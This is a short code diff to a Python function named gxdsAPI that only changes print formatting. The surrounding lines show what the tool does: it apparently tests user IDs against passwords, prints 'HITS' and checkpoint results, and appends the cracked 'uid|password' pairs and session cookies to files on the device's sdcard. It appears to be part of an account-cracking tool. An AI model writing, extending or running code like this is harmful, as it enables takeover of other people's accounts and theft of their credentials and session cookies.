@@ -615,8 +615,7 @@ def gxdsAPI(uid, pxss, tl):
                     ]
                 )
                 print(
-                    f"""{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}
-"""
+                    f"""{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}"""
                 )
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
@@ -630,8 +629,7 @@ def gxdsAPI(uid, pxss, tl):
                     ]
                 )
                 print(
-                    f"""{lr}  [GXDS X] {uid} : {ps} -\033[0;33m {yrs}
-"""
+                    f"""{lr}  [GXDS X] {uid} : {ps} -\033[0;33m {yrs}"""
                 )
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
